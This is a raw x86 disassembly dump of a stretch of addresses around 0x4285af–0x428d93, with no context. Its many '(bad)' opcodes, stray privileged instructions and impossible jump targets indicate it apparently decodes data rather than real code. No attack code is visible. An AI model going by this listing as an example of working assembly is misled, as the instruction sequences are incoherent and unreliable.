  4285af:	test   DWORD PTR [eax],eax
  4285b1:	(bad)  
  4285b2:	dec    WORD PTR [ebp-0xff002d]
  4285b9:	mov    DWORD PTR [eax+edi*4+0x0],edi
  4285bd:	jmp    DWORD PTR [esi-0x73]
  4285c0:	lea    esi,[eax+0x50ffffff]
  4285c6:	fadd   QWORD PTR [ebp+0x0]
  4285c9:	xor    esp,DWORD PTR [esi+0x3]
  4285cc:	lea    edx,[eax-0x1]
  4285cf:	test   edi,edi
  4285d1:	dec    DWORD PTR [ebp-0x1]
  4285d4:	mov    edi,edi
  4285d6:	dec    eax
  4285d7:	clc    
  4285d8:	call   DWORD PTR [ebp-0x73]
  4285db:	lea    esi,[eax+0x51ffff88]
  4285e1:	lea    ecx,[ebp-0x78]
  4285e4:	test   WORD PTR [ebp-0x2],ax
  4285eb:	popf   
  4285ec:	push   eax
  4285ed:	add    BYTE PTR [ecx-0x77],dl
  4285f0:	xor    edi,DWORD PTR [eax-0x7236007d]
  4285f6:	cwde   
  4285f7:	mov    al,0x32
  4285f9:	inc    DWORD PTR [ebx]
  4285fb:	push   eax
  4285fc:	push   ecx
  4285fd:	inc    ebp
  4285fe:	shl    BYTE PTR [ebx],1
  428600:	lea    eax,[ebx]
  428602:	call   DWORD PTR [eax-0x1]
  428605:	test   DWORD PTR [ebx],esi
  428607:	inc    DWORD PTR [eax-0x1]
  42860a:	(bad)  
  42860b:	(bad)  
  42860c:	(bad)  
  42860d:	clc    
  42860e:	call   DWORD PTR [ebp+0x50]
  428611:	jmp    0xcb878b
  428616:	inc    esp
  428617:	jnp    0x428618
  428619:	add    BYTE PTR [ecx-0x484f73],cl
  42861f:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  428625:	mov    eax,DWORD PTR [ecx]
  428627:	data16 add BYTE PTR [ebp-0xb50077],al
  42862e:	inc    eax
  428630:	lea    esp,[esi+0x14]
  428633:	test   DWORD PTR [ecx-0xb301],ecx
  428639:	inc    edi
  42863a:	(bad)  
  42863b:	dec    si
  42863d:	test   edi,edi
  42863f:	(bad)  
  428640:	cmp    eax,0xc74f73ff
  428645:	mov    edx,DWORD PTR [edx-0x7d]
  428648:	push   DWORD PTR [ebx+0x56328939]
  42864e:	(bad)  
  42864f:	call   FWORD PTR [esi-0x47]
  428652:	inc    DWORD PTR ds:0x893c00ea
  428658:	(bad)  
  428659:	pop    eax
  42865a:	mov    ah,0xff
  42865c:	(bad)  
  42865d:	mov    ecx,0x5745
  428662:	dec    DWORD PTR [ecx-0xf7a501]
  428668:	(bad)  
  428669:	mov    ecx,0x456108
  42866e:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  428674:	test   BYTE PTR [ebp-0x72ff23fd],cl
  42867a:	inc    BYTE PTR gs:[eax]
  42867d:	inc    DWORD PTR [ebp-0x73]
  428680:	cmp    dh,bh
  428682:	pushf  
  428683:	inc    edi
  428685:	mov    ebx,eax
  428687:	hlt    
  428688:	test   DWORD PTR [ecx-0xbab708],ecx
  42868e:	cmp    al,0xbe
  428690:	pushf  
  428691:	or     bh,al
  428693:	pop    es
  428694:	lock into 
  428696:	test   eax,eax
  428698:	clc    
  428699:	mov    ebx,0x387245
  42869e:	lahf   
  42869f:	retf   
  4286a0:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  4286a6:	add    edi,edi
  4286a8:	add    BYTE PTR [ecx+0x45],dl
  4286ab:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  4286b2:	mov    edx,DWORD PTR [ecx-0x74]
  4286b5:	inc    DWORD PTR [eax]
  4286b7:	cld    
  4286b8:	mov    eax,DWORD PTR [ebp-0x6f0175]
  4286be:	add    BYTE PTR [ebp-0x1b0177],al
  4286c4:	jge    0x42870b
  4286c6:	test   DWORD PTR [ebx+0xff9875],ecx
  4286cc:	sbb    BYTE PTR [esi+0x55],ah
  4286cf:	xchg   ebp,eax
  4286d0:	call   0x4281d4
  4286d5:	push   edi
  4286d6:	inc    ebp
  4286d7:	mov    dx,WORD PTR [ebp-0xfc0075]
  4286de:	cmp    al,0x85
  4286e0:	ud0    eax,DWORD PTR [ebp-0x1]
  4286e4:	test   DWORD PTR [edi+0x74],ecx
  4286e7:	dec    edi
  4286e8:	inc    DWORD PTR [ebp-0xf70004]
  4286ee:	dec    DWORD PTR [edi-0x75]
  4286f1:	dec    edi
  4286f2:	cld    
  4286f3:	test   DWORD PTR [eax+0xff01ff],eax
  4286f9:	icebp  
  4286fa:	add    BYTE PTR [edi-0x3a],cl
  4286fd:	test   ebx,eax
  4286ff:	inc    BYTE PTR [ebp-0x1]
  428702:	jne    0x428704
  428704:	mov    eax,DWORD PTR [eax]
  428706:	cld    
  428707:	xor    BYTE PTR [ecx+0x500155],cl
  42870d:	push   ebp
  42870e:	xor    DWORD PTR [ecx+0x45011c80],ecx
  428714:	add    BYTE PTR [ebp+0x35e90f50],al
  42871a:	add    al,BYTE PTR [eax]
  42871c:	add    BYTE PTR [ebx-0x38fe4f80],al
  428722:	add    ah,ch
  428724:	or     BYTE PTR [ebp+0x4501f845],dh
  42872a:	jmp    0xde8a27
  42872f:	(bad)  
  428730:	nop    ecx
  428733:	test   DWORD PTR [ebp+0x4502f8],eax
  428739:	cmp    cl,BYTE PTR [ebp-0x64]
  42873c:	mov    eax,edi
  42873e:	mov    ebx,DWORD PTR [eax+edx*2]
  428741:	add    eax,0x45fef885
  428746:	dec    DWORD PTR [ebx+0x339445]
  42874c:	add    ecx,DWORD PTR [ecx+0x4500f889]
  428752:	dec    DWORD PTR [ebx-0x460f0375]
  428758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428759:	add    esi,edi
  42875b:	add    bh,bh
  42875d:	rdpmc  
  42875f:	add    BYTE PTR [ebx],0x1
  428762:	mov    DWORD PTR [eax],eax
  428764:	add    al,0x45
  428766:	dec    DWORD PTR [ecx-0x360b3373]
  42876c:	dec    DWORD PTR [esi]
  42876e:	push   eax
  42876f:	jne    0x4287b6
  428771:	mov    esi,DWORD PTR [ebx]
  428773:	cld    
  428774:	add    ebp,ebx
  428776:	push   eax
  428777:	inc    DWORD PTR [ebp-0x75]
  42877a:	add    eax,0x800e4
  42877f:	add    BYTE PTR [ebx-0x7f7403bf],cl
  428785:	mov    DWORD PTR [ecx],eax
  428787:	sbb    al,0x0
  428789:	leave  
  42878a:	test   DWORD PTR [edi-0x2],eax
  42878d:	jne    0x42878e
  42878f:	call   0xff437294
  428794:	xor    BYTE PTR [ebp+0x4d],al
  428797:	mov    edi,edi
  428799:	enter  0x8,0x4d
  42879d:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4287a3:	mov    eax,DWORD PTR [eax]
  4287a5:	cld    
  4287a6:	add    DWORD PTR [ecx],ebx
  4287a8:	inc    ebp
  4287a9:	dec    ebp
  4287aa:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4287b0:	inc    eax
  4287b1:	dec    DWORD PTR [ecx-0x270375]
  4287b7:	add    BYTE PTR [ebx-0x39d72701],cl
  4287bd:	xchg   ecx,eax
  4287be:	ret    
  4287bf:	add    BYTE PTR [ebp-0x830075],al
  4287c5:	add    BYTE PTR [ebp-0x75],al
  4287c8:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4287ce:	lea    edi,[edi-0xc]
  4287d1:	add    bh,bh
  4287d3:	mov    edx,DWORD PTR [eax-0x7b]
  4287d6:	inc    ebp
  4287d7:	rdpmc  
  4287d9:	jne    0x4287de
  4287db:	add    BYTE PTR [eax-0x75],dl
  4287de:	inc    ebp
  4287df:	clc    
  4287e0:	add    eax,0x400009
  4287e5:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4287eb:	mov    eax,DWORD PTR [ecx]
  4287ed:	in     al,dx
  4287ee:	add    dh,al
  4287f0:	test   ebx,eax
  4287f2:	inc    BYTE PTR [ebp-0xff0001]
  4287f8:	add    BYTE PTR [ebp-0x43],al
  4287fb:	cmp    esi,0xfffffff8
  4287fe:	(bad)  
  4287ff:	push   DWORD PTR [eax]
  428801:	add    BYTE PTR [ebp-0x3a],dl
  428804:	test   ebx,eax
  428806:	je     0x42878d
  428808:	mov    edi,edi
  42880a:	sbb    al,0xff
  42880c:	test   DWORD PTR gs:[eax],eax
  42880f:	(bad)  
  428810:	js     0x428811
  428812:	add    BYTE PTR [ebx-0x39b20bdd],cl
  428818:	sub    eax,ebx
  42881a:	mov    ecx,DWORD PTR [ebx-0x55130377]
  428820:	add    eax,DWORD PTR [eax]
  428822:	dec    ebp
  428823:	push   eax
  428824:	mov    al,BYTE PTR [ebp+0x1]
  428827:	mov    eax,DWORD PTR [ebp-0x68]
  42882a:	mov    eax,DWORD PTR [eax]
  42882c:	sbb    bh,al
  42882e:	or     ah,dh
  428830:	dec    ebp
  428831:	inc    DWORD PTR [eax+0x4]
  428834:	push   ecx
  428835:	add    BYTE PTR [edx-0x1],dh
  428838:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  42883e:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  428848:	add    ecx,DWORD PTR [ecx-0x1be77477]
  42884e:	push   ecx
  42884f:	cmp    BYTE PTR [ebx],al
  428851:	inc    ebp
  428852:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  428858:	(bad)  
  428859:	(bad)  
  42885a:	in     al,0xff
  42885c:	add    BYTE PTR [ebp+0x0],al
  42885f:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  428865:	add    al,bh
  428867:	(bad)  
  428868:	jmp    0x8d85:0x74b0558d
  42886f:	dec    DWORD PTR [eax]
  428871:	call   DWORD PTR [ebp-0x7b]
  428874:	mov    edi,esi
  428876:	lock call DWORD PTR [ebp-0x75]
  42887a:	mov    esi,esp
  42887c:	mov    ah,0xc6
  42887e:	mov    bh,0xc3
  428880:	mov    DWORD PTR [ebx-0x110003c4],ecx
  428886:	add    DWORD PTR [eax],0x450050ff
  42888c:	mov    DWORD PTR [ebx+0x9598cc],ecx
  428892:	inc    edi
  428894:	push   esp
  428896:	jmp    0xcd00:0x680481ff
  42889d:	mov    DWORD PTR [ebx],esi
  42889f:	clc    
  4288a0:	cmp    edi,0xff9cff3b
  4288a6:	jne    0x4288b0
  4288a8:	mov    eax,eax
  4288aa:	add    esi,DWORD PTR [eax]
  4288ac:	int3   
  4288ad:	inc    ebp
  4288ae:	cmp    al,0x83
  4288b0:	add    BYTE PTR [eax],bl
  4288b2:	adc    DWORD PTR [ebx+0x768b5055],eax
  4288b8:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4288be:	mov    edi,eax
  4288c0:	cmp    BYTE PTR [ebp+0x45],cl
  4288c3:	jmp    0x428850
  4288c5:	mov    ebx,DWORD PTR [esp+ebp*8]
  4288c8:	inc    ebp
  4288c9:	or     al,0x2
  4288cb:	dec    DWORD PTR [ebp+0x18]
  4288ce:	jne    0x428925
  4288d0:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4288d6:	mov    edi,DWORD PTR [ebx]
  4288d8:	in     al,0x50
  4288da:	xchg   ecx,eax
  4288db:	jmp    0x342d7e0
  4288e0:	adc    al,0x8b
  4288e2:	inc    ebp
  4288e3:	mov    al,ds:0x8b04008b
  4288e8:	push   ebp
  4288e9:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4288ef:	push   ebp
  4288f0:	test   DWORD PTR [ebx-0x2800d701],ecx
  4288f6:	inc    ebp
  4288f7:	dec    ebp
  4288f8:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4288fe:	mov    DWORD PTR [eax],0xe9ff00f4
  428904:	add    al,0x0
  428906:	add    BYTE PTR [eax],al
  428908:	mov    eax,edx
  42890a:	push   eax
  42890b:	rol    DWORD PTR [ebp-0xf0177],1
  428911:	bound  eax,QWORD PTR [ebp+0x50]
  428914:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  42891a:	add    BYTE PTR [ecx+0x558df0ff],cl
  428920:	mov    al,0xf
  428922:	test   DWORD PTR [edx],edx
  428924:	call   DWORD PTR [ebp-0x7a0001]
  42892a:	(bad)  
  42892b:	loop   0x42892c
  42892d:	jnp    0xc6987d33
  428933:	mov    eax,ebx
  428935:	cmp    al,0x8b
  428937:	(bad)  
  428938:	cld    
  428939:	shr    esi,0xc
  42893c:	add    dl,al
  42893e:	push   eax
  42893f:	lea    eax,[ebp-0x1]
  428942:	mov    edx,esi
  428944:	cwde   
  428945:	cli    
  428946:	add    BYTE PTR [ebp+0x1ffff8ff],al
  42894c:	or     BYTE PTR [eax],cl
  42894e:	inc    ebp
  42894f:	dec    ebp
  428950:	inc    DWORD PTR [ebx+0x74803914]
  428956:	add    DWORD PTR [ebx+0x451800],ecx
  42895c:	call   DWORD PTR [eax+edx*1]
  42895f:	add    ecx,DWORD PTR [ebp-0x34]
  428962:	push   edi
  428963:	adc    al,0x8
  428965:	mov    edx,DWORD PTR [ebp-0x14]
  428968:	mov    ecx,DWORD PTR [ebp+0x18]
  42896b:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  42896f:	inc    DWORD PTR [eax+esi*8]
  428972:	inc    ebp
  428973:	stos   BYTE PTR es:[edi],al
  428974:	mov    edx,DWORD PTR [ebp-0x4]
  428977:	add    DWORD PTR [ebp-0x1c],eax
  42897a:	mov    edx,DWORD PTR [ebp-0x70]
  42897d:	cmp    eax,DWORD PTR [eax]
  42897f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428980:	mov    eax,DWORD PTR [eax]
  428982:	cld    
  428983:	jae    0x428905
  428985:	add    eax,DWORD PTR [ecx]
  428987:	clc    
  428988:	add    BYTE PTR [eax+0x30],dl
  42898b:	mov    DWORD PTR [ecx],esi
  42898d:	clc    
  42898e:	pop    ds
  42898f:	inc    ebp
  428990:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  428996:	(bad)  
  428997:	push   DWORD PTR [edi]
  428999:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  42899f:	(bad)  
  4289a0:	jae    0x4289a1
  4289a2:	mov    eax,DWORD PTR [ebp-0x740175]
  4289a8:	sub    eax,DWORD PTR [eax]
  4289aa:	add    eax,DWORD PTR [eax]
  4289ac:	mov    DWORD PTR [ecx+0x5f],eax
  4289af:	mov    DWORD PTR [ebx-0x4],ebx
  4289b2:	ret    0xff
  4289b5:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4289bb:	ret    
  4289bc:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4289c2:	add    BYTE PTR [ebp-0x7d],al
  4289c5:	mov    DWORD PTR [eax],eax
  4289c7:	add    al,0x84
  4289c9:	inc    DWORD PTR [ecx]
  4289cb:	lea    eax,[eax]
  4289cd:	hlt    
  4289ce:	sar    bh,cl
  4289d0:	test   BYTE PTR [eax+0x1],dl
  4289d3:	inc    ebp
  4289d4:	add    BYTE PTR [ebx],dh
  4289d6:	test   BYTE PTR [ebx],0x84
  4289d9:	push   eax
  4289da:	add    BYTE PTR [ebp+0x0],al
  4289dd:	add    eax,0x86
  4289e2:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4289e8:	add    BYTE PTR [ecx],al
  4289ea:	add    BYTE PTR [eax],al
  4289ec:	mov    esi,0x550030
  4289f1:	mov    ecx,DWORD PTR [edi]
  4289f3:	cld    
  4289f4:	fidiv  DWORD PTR [ebp+0x0]
  4289f7:	mov    edi,DWORD PTR [ecx]
  4289f9:	xor    BYTE PTR [eax+eax*1],0x84
  4289fd:	add    eax,DWORD PTR [eax]
  4289ff:	sbb    BYTE PTR [eax],al
  428a01:	jne    0x4289b4
  428a03:	mov    eax,DWORD PTR [ecx]
  428a05:	sbb    BYTE PTR [eax],al
  428a07:	mov    DWORD PTR [ebp-0x1],esp
  428a0a:	add    BYTE PTR [eax+0x30e45ca],bh
  428a10:	ret    0xb7fc
  428a13:	dec    ebp
  428a14:	or     al,0x89
  428a16:	dec    ebp
  428a17:	cld    
  428a18:	cmovne ecx,DWORD PTR [eax-0x75]
  428a1c:	add    edi,esp
  428a1e:	seto   BYTE PTR [esi-0x72ffffff]
  428a25:	inc    ebp
  428a26:	adc    al,0x8b
  428a28:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  428a2f:	cmp    DWORD PTR [edi+0x72],edx
  428a32:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428a38:	gs cmp al,0x0
  428a3b:	je     0x428a13
  428a3d:	push   eax
  428a3e:	sar    BYTE PTR [eax],1
  428a40:	mov    bh,0x3e
  428a42:	push   cs
  428a43:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428a49:	add    DWORD PTR [ecx+0x12],ebp
  428a4c:	dec    edx
  428a4d:	(bad)  
  428a4e:	mov    eax,edx
  428a50:	in     al,dx
  428a51:	adc    DWORD PTR [ecx],esi
  428a53:	pop    esi
  428a54:	inc    ecx
  428a55:	leave  
  428a56:	or     DWORD PTR [eax],ebx
  428a58:	gs push ebp
  428a5a:	add    ah,ch
  428a5c:	into   
  428a5d:	in     al,dx
  428a5e:	enter  0xb756,0xf0
  428a62:	push   cs
  428a63:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  428a6d:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  428a73:	jnp    0x74430f7b
  428a79:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  428a7f:	add    BYTE PTR [edi],cl
  428a81:	mov    edi,DWORD PTR [ecx-0x78]
  428a84:	ltr    WORD PTR [ecx-0x7b]
  428a88:	dec    DWORD PTR [edi]
  428a8a:	clc    
  428a8b:	out    0x45,eax
  428a8d:	add    BYTE PTR [eax],cl
  428a8f:	cmp    ebx,0xffffff8c
  428a92:	jge    0x428a94
  428a94:	jb     0x428aa6
  428a96:	je     0x518b16
  428a9c:	pop    edx
  428a9d:	push   esi
  428a9e:	mov    ecx,DWORD PTR [edi]
  428aa0:	in     al,dx
  428aa1:	rol    DWORD PTR [ebp+0x0],1
  428aa4:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428aab:	cmp    DWORD PTR [ecx],0xfffffff0
  428aae:	hlt    
  428aaf:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428ab5:	(bad)  
  428ab7:	push   eax
  428ab8:	jns    0xb8426f36
  428abe:	lock push cs
  428ac0:	ror    edx,0x3
  428ac3:	test   BYTE PTR [ecx+0x5500e800],cl
  428ac9:	dec    eax
  428aca:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428ace:	(bad)  
  428acf:	mov    esi,0x7f33ff5f
  428ad4:	inc    eax
  428ad5:	test   DWORD PTR [edx],eax
  428ad7:	je     0x428a99
  428ad9:	mov    ecx,ecx
  428adb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428adf:	and    eax,DWORD PTR [eax+0xf0103]
  428ae5:	jp     0x428ad3
  428ae7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428aeb:	add    edx,DWORD PTR [edi+0x74]
  428aee:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428af4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428afa:	je     0x428a7f
  428afc:	cmp    eax,edi
  428afe:	js     0x428b23
  428b00:	add    eax,0xeb0fc003
  428b05:	jns    0x428a92
  428b07:	vmread DWORD PTR [ecx+0x45],ebx
  428b0b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428b11:	adc    al,0x8b
  428b13:	jge    0x428b29
  428b15:	mov    edi,DWORD PTR [eax-0x4]
  428b18:	add    edi,DWORD PTR [edi]
  428b1a:	or     bh,bh
  428b1c:	push   ebp
  428b1d:	push   es
  428b1e:	mov    DWORD PTR [ebp-0x4],ebx
  428b21:	add    edi,esi
  428b23:	pop    es
  428b24:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b2a:	mov    DWORD PTR [esp+esi*8],ecx
  428b2d:	inc    ebp
  428b2e:	pop    ebp
  428b2f:	xor    DWORD PTR [esi-0x4],0x3b
  428b33:	add    edx,DWORD PTR [ecx+edi*1]
  428b36:	push   es
  428b37:	clc    
  428b38:	mov    bh,0xdb
  428b3a:	jp     0x428af3
  428b3c:	add    cl,BYTE PTR [esi]
  428b3e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b44:	test   edi,edi
  428b46:	je     0x428b3c
  428b48:	mov    eax,ecx
  428b4a:	or     BYTE PTR [ebx],al
  428b4c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b52:	jbe    0x428bc6
  428b54:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b5a:	add    ecx,DWORD PTR [esi]
  428b5c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b62:	add    eax,DWORD PTR [ebx-0x287af783]
  428b68:	je     0x428bb7
  428b6a:	mov    DWORD PTR [ecx],edi
  428b6c:	mov    esi,eax
  428b6e:	hlt    
  428b6f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b76:	jb     0x428b38
  428b78:	jmp    0x428b65
  428b7a:	xor    esi,DWORD PTR [ebx]
  428b7c:	pop    edi
  428b7d:	pop    esi
  428b7e:	pop    ebx
  428b7f:	ret    
  428b80:	ret    0x8b
  428b83:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b89:	cmp    DWORD PTR [eax],0xc
  428b8c:	pushf  
  428b8d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b93:	(bad)  
  428b95:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b9c:	dec    ebp
  428b9d:	ret    
  428b9e:	mov    edi,DWORD PTR [esi-0x4]
  428ba1:	pop    eax
  428ba2:	dec    ebp
  428ba3:	jne    0x428b30
  428ba5:	xor    edi,esp
  428ba7:	inc    eax
  428ba8:	dec    ebp
  428ba9:	jbe    0x428bfe
  428bab:	inc    eax
  428bac:	pop    ebp
  428bad:	add    edx,DWORD PTR [esi+0x8]
  428bb0:	push   eax
  428bb1:	dec    eax
  428bb2:	push   ecx
  428bb3:	mov    eax,edi
  428bb5:	and    al,0xf0
  428bb7:	jo     0x428ba4
  428bb9:	mov    eax,DWORD PTR [ebx]
  428bbb:	sbb    BYTE PTR [ebp+0x4d],cl
  428bbe:	mov    eax,DWORD PTR [ebx]
  428bc0:	nop
  428bc1:	or     BYTE PTR [eax],al
  428bc3:	jne    0x428c1c
  428bc5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bcb:	cld    
  428bcc:	xor    edi,edi
  428bce:	add    edi,DWORD PTR [ebp+0x3]
  428bd1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bd7:	js     0x428b5d
  428bd9:	jae    0x428bdd
  428bdb:	(bad)  
  428bdd:	xor    al,0x5d
  428bdf:	jmp    0x428b6c
  428be1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428be8:	fdecstp 
  428bea:	test   BYTE PTR [edi],ah
  428bec:	add    bh,BYTE PTR [ebp+0x0]
  428bef:	add    ebx,DWORD PTR [ebp-0x77]
  428bf2:	mov    edi,eax
  428bf4:	cmp    al,0x0
  428bf7:	adc    dh,BYTE PTR [ebx]
  428bf9:	jge    0x428bfe
  428bfb:	mov    edi,DWORD PTR [ebx]
  428bfd:	jl     0x428c0e
  428bff:	clc    
  428c00:	dec    edi
  428c01:	jge    0x428c03
  428c03:	mov    eax,DWORD PTR [ebx]
  428c05:	jb     0x428c0f
  428c07:	mov    ecx,DWORD PTR [ebp-0x8]
  428c0a:	mov    edi,edi
  428c0c:	xor    edx,DWORD PTR [eax]
  428c0e:	add    edi,DWORD PTR [ebx]
  428c10:	mov    DWORD PTR [ebp-0x10],edi
  428c13:	inc    edi
  428c14:	pop    ebp
  428c15:	jge    0x428c52
  428c17:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428c1b:	mov    edx,0xc05d87f0
  428c20:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c24:	fimul  WORD PTR [eax]
  428c26:	fist   WORD PTR [ebp+0x1c]
  428c29:	in     al,dx
  428c2a:	jne    0x428c18
  428c2c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c32:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c36:	fdivp  st(0),st
  428c38:	fild   WORD PTR [ebp+0x4510f85c]
  428c3e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c44:	inc    ebp
  428c45:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c4b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c4e:	adc    al,0x8b
  428c50:	rcl    DWORD PTR [eax],0x48
  428c53:	mov    esi,0x7080803
  428c58:	fiadd  WORD PTR [ebp+0x4d]
  428c5b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c61:	cld    
  428c62:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c68:	mov    DWORD PTR [edi+0x872dc],edi
  428c6e:	xlat   BYTE PTR ds:[ebx]
  428c6f:	into   
  428c70:	ffreep st(6)
  428c72:	retf   0x6c7
  428c75:	iret   
  428c76:	dec    ebp
  428c77:	inc    ebp
  428c78:	mov    DWORD PTR [ebx],edi
  428c7a:	fmul   QWORD PTR [edi]
  428c7c:	dec    ebp
  428c7d:	jnp    0x428cb2
  428c7f:	add    BYTE PTR [ebx],al
  428c81:	mov    ecx,DWORD PTR [esp+edi*8]
  428c84:	inc    ebp
  428c85:	dec    ebp
  428c86:	lea    esi,[ebx]
  428c88:	add    DWORD PTR [ebx],eax
  428c8a:	jb     0x428cc7
  428c8c:	add    BYTE PTR [edi],cl
  428c8e:	inc    ebp
  428c8f:	imul   eax,edi,0x858bd800
  428c95:	cld    
  428c96:	clc    
  428c97:	mov    DWORD PTR [ebp+0x0],eax
  428c9a:	inc    DWORD PTR [eax]
  428c9c:	or     al,0xde
  428c9e:	sbb    bh,0x1
  428ca1:	retf   
  428ca2:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428ca9:	dec    ebp
  428caa:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428cb0:	enter  0x12de,0xdf
  428cb4:	inc    ebp
  428cb5:	pop    ebp
  428cb6:	dec    DWORD PTR [ebx-0x257f0ff4]
  428cbc:	add    DWORD PTR [edx],edx
  428cbe:	add    BYTE PTR [ebp+0x50],dl
  428cc1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428cc7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428ccd:	or     ah,al
  428ccf:	pop    ss
  428cd0:	cdq    
  428cd1:	push   ebp
  428cd2:	clc    
  428cd3:	mov    eax,DWORD PTR [ebp-0x4]
  428cd6:	xor    edx,edx
  428cd8:	add    esi,DWORD PTR [ebx]
  428cda:	cmp    eax,DWORD PTR [ebx]
  428cdc:	hlt    
  428cdd:	cmp    DWORD PTR [ebx],esp
  428cdf:	or     al,BYTE PTR [ebp+0xf]
  428ce2:	mov    eax,DWORD PTR [edx]
  428ce4:	loopne 0x428ce6
  428ce6:	(bad)  
  428ce7:	mov    ecx,esi
  428ce9:	cld    
  428cea:	pushf  
  428ceb:	pop    ebp
  428cec:	cwde   
  428ced:	mov    esi,DWORD PTR [edx]
  428cef:	lock mov eax,eax
  428cf2:	adc    BYTE PTR [ebx],al
  428cf4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cfb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428d01:	dec    ebp
  428d02:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428d08:	(bad)  
  428d09:	iret   
  428d0a:	inc    ebp
  428d0b:	(bad)  
  428d0c:	jne    0x428d5b
  428d0e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428d14:	(bad)  
  428d15:	cmp    ebx,eax
  428d17:	je     0x428c9f
  428d19:	add    edi,edi
  428d1b:	or     bh,bh
  428d1d:	dec    ebp
  428d1e:	inc    ebp
  428d1f:	mov    esi,DWORD PTR [ebx]
  428d21:	cld    
  428d22:	add    ecx,esi
  428d24:	cmp    ecx,DWORD PTR [eax-0xc]
  428d27:	mov    edx,DWORD PTR [edi]
  428d29:	or     BYTE PTR [ebp-0x7c],al
  428d2c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d32:	test   BYTE PTR [eax+ebx*4],cl
  428d35:	inc    ebp
  428d36:	xor    bh,BYTE PTR ds:0x8be89c89
  428d3c:	out    dx,eax
  428d3d:	adc    BYTE PTR [eax],al
  428d3f:	jne    0x428d08
  428d41:	mov    ebp,esp
  428d43:	fcomp  DWORD PTR [ebx]
  428d45:	add    BYTE PTR [ecx],al
  428d47:	inc    DWORD PTR [ebp-0x75]
  428d4a:	mov    ?,esp
  428d4c:	add    al,0xce
  428d4e:	mov    ecx,edi
  428d50:	cld    
  428d51:	inc    ebp
  428d52:	fidivr WORD PTR [ebx]
  428d54:	fbstp  TBYTE PTR [ebp-0x3e]
  428d57:	mov    eax,DWORD PTR [eax]
  428d59:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d5f:	fadd   st,st(7)
  428d61:	add    BYTE PTR [ebp-0x1],al
  428d64:	mov    ecx,DWORD PTR [esp+edi*8]
  428d67:	inc    ebp
  428d68:	mov    bh,0xc7
  428d6b:	loopne 0x428db2
  428d6d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d73:	add    DWORD PTR [ebx],esi
  428d75:	pushf  
  428d76:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d7c:	mov    eax,edi
  428d7e:	cwde   
  428d7f:	inc    ebp
  428d80:	inc    ebp
  428d81:	jne    0x428d0e
  428d83:	mov    esp,esp
  428d85:	clc    
  428d86:	add    al,0x4d
  428d88:	mov    DWORD PTR [ebx],esi
  428d8a:	or     al,0x33
  428d8c:	inc    ebp
  428d8d:	lea    ecx,[ebx-0x398d13fd]
  428d93:	add    bh,al
